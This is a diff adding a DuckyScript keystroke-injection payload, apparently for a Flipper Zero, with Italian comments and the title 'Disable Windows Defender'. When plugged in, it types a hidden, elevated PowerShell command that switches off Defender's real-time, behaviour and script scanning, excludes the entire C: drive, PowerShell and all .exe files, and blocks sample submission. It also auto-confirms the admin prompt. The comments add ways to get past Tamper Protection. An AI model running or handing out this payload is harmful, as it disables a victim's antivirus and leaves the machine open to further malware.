@@ -1,0 +1,40 @@
+REM ============================================================
+REM Title:    Disable Windows Defender
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Evasion
+REM Privs:    Admin REQUIRED
+REM Layout:   IT
+REM Time:     ~5 secondi
+REM Detect:   Alto - la disabilitazione stessa genera alert
+REM Desc:     Disabilita Windows Defender: real-time protection,
+REM           cloud protection, sample submission, tamper protection.
+REM           Aggiunge esclusione su C:\ per evitare scan.
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true;Add-MpPreference -ExclusionPath ''C:\'' -ExclusionProcess ''powershell.exe'' -ExclusionExtension ''.exe'';Set-MpPreference -SubmitSamplesConsent 2"'
+ENTER
+DELAY 2000
+ALT y
+
+REM ============================================================
+REM NOTA: Su Windows 11 con Tamper Protection attivo,
+REM questi comandi FALLIRANNO silenziosamente.
+REM
+REM Alternative per Tamper Protection:
+REM 1. Disabilita manualmente: Windows Security → Virus &
+REM    threat → Manage settings → Tamper Protection OFF
+REM 2. Via GPO (se domain admin):
+REM    Computer Config → Admin Templates → Windows Components
+REM    → Microsoft Defender → Turn off Microsoft Defender
+REM 3. Via registry (richiede TrustedInstaller):
+REM    HKLM\SOFTWARE\Microsoft\Windows Defender\Features
+REM    TamperProtection = 0
+REM
+REM Per verificare lo stato:
+REM   Get-MpPreference | Select DisableRealtimeMonitoring
+REM   Get-MpComputerStatus | Select RealTimeProtectionEnabled
+REM ============================================================
